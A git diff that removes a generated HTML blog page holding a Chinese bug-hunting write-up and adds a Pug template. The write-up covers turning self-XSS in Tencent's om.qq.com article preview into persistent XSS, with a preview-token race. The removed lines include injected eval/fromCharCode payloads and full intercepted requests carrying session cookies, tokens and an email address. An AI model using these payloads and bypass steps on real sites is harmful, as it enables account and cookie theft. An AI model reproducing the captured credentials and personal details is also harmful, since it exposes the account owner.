@@ -1,213 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
+extends includes/layout
 
-    <title>
-        
-        从SELF-XSS到存储型XSS/附绕过token分析过程 - undefined
-        
-    </title>
+block content
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
-    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
-    <!-- ga & ba script hoook -->
-    <script></script>
-</head>
+    section#wrapper.post
+        article
+            header
+                h1!=page.title
+                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
+                    |·
+                    |#{wordcount(page.content)} words
+                    |·
+                    |#{min2read(page.content)} minutes read
+                    span.tags
 
-<body>
+            if toc(page.content)
+                div#toc!=toc(page.content,{list_number:false})
 
-<div class="site-nav-toggle" id="site-nav-toggle">
-    <button>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-    </button>
-</div>
+            section#post-body!=page.content
 
-<div class="index-about">
-    <i>  </i>
-</div>
+            - var prev = page.prev ? page.prev.path : false;
+            - var next = page.next ? page.next.path : false;
+            nav#post-nav
+                span.prev
+                    if page.prev
+                        a(href=url_for(prev))
+                            span.arrow ←
+                            | Newer Posts
+                span.next
+                    if page.next
+                        a(href=url_for(next))
+                            | Older Posts
+                            span.arrow →
 
-<div class="index-container">
-    
-    <div class="index-left">
-        
-<div class="nav" id="nav">
-    <div class="avatar-name">
-        <div class="avatar ">
-            <img src="/c1y2m3.github.io/">
-        </div>
-        <div class="name">
-            <i>John Doe</i>
-        </div>
-    </div>
-    <div class="contents" id="nav-content">
-        <ul>
-            <li>
-                <a href="/c1y2m3.github.io/">
-                    <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/tags">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/archives">
-                    <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/about/">
-                    <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-    
-        <div id="toc" class="toc-article">
-    
-</div>
-    
-</div>
-
-
-<div class="search-field" id="search-field">
-    <div class="search-container">
-        <div class="search-input">
-            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input">
-            <span id="begin-search">search</span>
-        </div>
-        <div class="search-result-container" id="search-result-container">
-
-        </div>
-    </div>
-</div>
-
-        <div class="index-about-mobile">
-            <i>  </i>
-        </div>
-    </div>
-    
-    <div class="index-middle">
-        <!-- Main Content -->
-        
-
-
-<div class="post-container">
-    <div class="post-title">
-        从SELF-XSS到存储型XSS/附绕过token分析过程
-    </div>
-
-    <div class="post-meta">
-        <span class="attr">Post：<span>2018-11-01 23:03:00</span></span>
-        
-        
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
-</span>
-
-    </div>
-    <div class="post-content ">
-        <p>真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。</p>
-<p>事情发生在2018年11月01日晚上，地点：北京 天气有点冷。<br>沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。</p>
-<p>0x01   已修复</p>
-<p><a href="https://om.qq.com/article/preview?articleId=20181101A1AC67" target="_blank" rel="noopener">https://om.qq.com/article/preview?articleId=20181101A1AC67</a><br>在文章正文处输入fuzz，发现输出在script标签下、script标签下从来不缺绕过的方法，然后输入payload，点击预览：</p>
-<p>参考：<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/18/%E6%B5%85%E8%B0%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">浅谈跨站脚本绕过和防御 </a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41));var pass=&#123;&apos;id&apos;: &apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png" alt=""><br>发现无法闭合，被过滤的明明白白了，可惜峰回路转，于是就有了下面的故事<br>抓取了预览包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=1 HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 628</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pgv_pvi=20205568; ptui_loginuin=49738195; pt2gguin=o0049738195; RK=IE7gjzyEER; ptcz=e26757456ce43cd621229cf0277060fe320cadbdb9fe960be031819bb0ff2445; pgv_pvid=2078291729; o_cookie=49738195; pac_uid=1_49738195; ts_uid=3270008848; tvfe_boss_uuid=b1944c47bc974c16; TSID=a6sjhfrnokjepmuvn1el6qn6h6; wxky=1; omtoken=8d3093de7a; omtoken_expire=1541058741; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; rmod=1; pgv_info=ssid=s7825261201; alertclicked=%7C%7C; 9e67236d07bdc7152e6e2b42b7f00f43=e6d7af23146a99ae80577cf63db0ae6875312071a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522vuexdDhyUgp6cIaVLUo0Dw00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=%3Cp%3E1%26%2339%3B%7D%3Beval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C49%2C50%2C51%2C41))%3Bvar+pass%3D%7B%26%2339%3Bid%26%2339%3B%3A+%26%2339%3B1%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3Cbr%2F%3E%3C%2Fp%3E&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A10YRL&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure></p>
-<p>发现在提交数据后，前端已经做了实体编码了。<br>在拦截之后修改content的值 ，然后Forward ~<br>返回包如下：<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small" alt=""><br><img src="http://i.3001.net/uploads/Up_imgs/20181101-fa790e1cceee92203177f6beeff436e4.png!small" alt=""></p>
-<p>成功弹窗~ So，推测<br>代码逻辑：客户端 -&gt; 前端进行编码 -&gt; 服务器接受参数时(未过滤)<br>于是 通过 客户端 -&gt; 前端进行编码 -&gt; 通过中间人修改参数 -&gt; 发送 -&gt; 服务器接受 -&gt; 渲染到页面触发XSS</p>
-<p>但是心想这只是个预览界面，无法交互道，别人是没办法访问的，相当于SELF-XSS，利用率不高，那我就发布上线吧，利用同样流程 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kuaibao.qq.com/s/20181101A10YRL00</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-2d0d3ab0cea43c0f49244238fc5c1c51.png!small" alt=""></p>
-<p>心想mmp，发布上线的后端在接受数据的时候，直接进行替换了，导致没办法利用…. 这个问题让我纠结了很久，睡觉睡觉。</p>
-<p>咦，不是预览处还有个二维码吗？二维码里面一定有个可以外部访问的链接，然后用手机打开</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-69dc95ec8c7e5b25103d3f32b215fecf.png!small" alt=""></p>
-<p>获得以下链接：<br><code>https://om.qq.com/open/preview?articleId=20181101A10A4T&amp;token=59354A0D09336BE940DB6A9A2EF32D38</code></p>
-<p>….  竟然还带token，并且token带有时间值，失效了就生成新的token，腾讯的同学真是良心用苦了。</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-d6fd5c4cab52b722e2130fba345f0367.png!small" alt=""></p>
-<p>但是就因为如此，存在了一些缺陷， 只要是在token没有失效的前提下， 无论怎么(重新)预览发布出去token还是原先的token值，所以可以通过条件竞争来维持会话的固定性，使得链接可以一直被访问。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=§1§ HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 467</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: TSID=flncmls3hsc30ihqn15363qn16; _qpsvr_localtk=0.5534494737035368; pgv_pvi=3438402560; pgv_si=s2581188608; ptui_loginuin=xiaoxuan339449639@163.com; wxky=1; omtoken=6cdb5bf845; omtoken_expire=1541077196; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; alertclicked=%7C%7C; rmod=1; pgv_info=ssid=s4945033110; ts_last=om.qq.com/article/articleManage; pgv_pvid=554507366; ts_uid=9880183784; tvfe_boss_uuid=d7a07c30dcda956a; 9e67236d07bdc7152e6e2b42b7f00f43=0bc53b88ec4021e7cddd3d738402d33535846c07a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522aFWX5zYL69tXvF97f3DLiQ00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));var pass=&#123;&apos;id&apos;: &apos;1&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A1AC67&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-e5431b2b2d26227d24194de0cfbee8e1.png!small" alt=""></p>
-<p>腾讯让人头疼的skey,可跨域打cookie，危害不能小视~<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-0ddd2eae3bd7ba416f8a94e0441d0753.png!small" alt=""></p>
-<p>0x02 修复建议：</p>
-<p>   原先自己觉得可以 session  == token ，每次发布的session 都不同， 后端判断 token = session ，但这不适合用于 这种场景，而是用于CSRF、 也是自己对条件竞争不太了解。</p>
-<p>1、后端对预览处进行过滤吧，XSS修复这种方法这里就不再提了。<br>2、对应条件竞争， 后端对发送请求时间间隔进行限制，也是最简单暴力的，但是同时又影响了用户的体验，正牌的方法是多线程加锁，并发（时间间隔极小）请求时，前一个线程的请求还未处理完时，开始处理第二个线程，后续的代码还没判断时第二个线程的请求也得到了处理，导致多个线程资源竞争问题 ，这个之后还要仔细研究一下。</p>
-
-        
-        <br>
-        <div id="comment-container">
-        </div>
-        <div id="disqus_thread"></div>
-
-        <div id="lv-container">
-        </div>
-
-    </div>
-</div>
-
-    </div>
-</div>
-
-
-<footer class="footer">
-    <ul class="list-inline text-center">
-        
-        
-
-        
-
-        
-
-        
-
-        
-
-    </ul>
-    
-    <p>
-        <span id="busuanzi_container_site_pv">
-            <span id="busuanzi_value_site_pv"></span>PV
-        </span>
-        <span id="busuanzi_container_site_uv">
-            <span id="busuanzi_value_site_uv"></span>UV
-        </span>
-        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
-</footer>
+            include includes/comment.pug
 
 
 
 
-</body>
-
-<script>
-    // We expose some of the variables needed by the front end
-    window.hexo_search_path = ""
-    window.hexo_root = "/c1y2m3.github.io/"
-    window.isPost = true
-</script>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-</html>
